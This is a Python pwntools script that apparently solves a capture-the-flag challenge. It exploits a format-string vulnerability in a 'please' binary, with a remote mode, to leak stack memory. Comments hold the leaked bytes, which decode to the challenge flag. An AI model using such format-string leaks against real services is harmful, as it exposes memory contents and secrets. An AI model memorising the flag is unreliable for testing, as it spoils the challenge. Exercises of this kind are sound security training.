from pwn import *
import re

HOST, PORT = "mc.ax", 31569
BINARY = './please'
context.log_level = 'critical'

# flag is located at 70 onwards
def initial_search():
    for i in range(0, 80):
        try:
            print("i is: {}".format(i))
            p = process(BINARY)
            p.recvline()
            p.sendline('please 0x%{}$08p'.format(i))
            print(p.recvline())
            p.close()

            print()
        except EOFError:
            pass

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process(BINARY)
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)

def solve():
    p = start()
    p.recvline()

    payload = 'please'
    for i in range(70, 78):
        payload += '%{}$p_'.format(i)

    p.sendline(payload)
    leak = p.recvline().decode('ascii')
    re_pattern = re.compile('please(.*) to you too!')
    scrambled_ans = re.search(re_pattern, leak).group(1)
    print(scrambled_ans)

solve()

# 0x33 6c 70 7b 67 61 6c 66
# 0x6e 31 72 70 5f 33 73 61
# 0x5f 68 74 31 77 5f 66 74
# 0x5f 6e 30 31 74 75 61 63
# 0x00 0a 7d 6c 78 33 61 39

# 66 6c 61 67 7b 70 6c 33
# 61 73 33 5f 70 72 31 6e
# 74 66 5f 77 31 74 68 5f
# 63 61 75 74 31 30 6e 5f
# 39 61 33 78 6c 7d 0a 00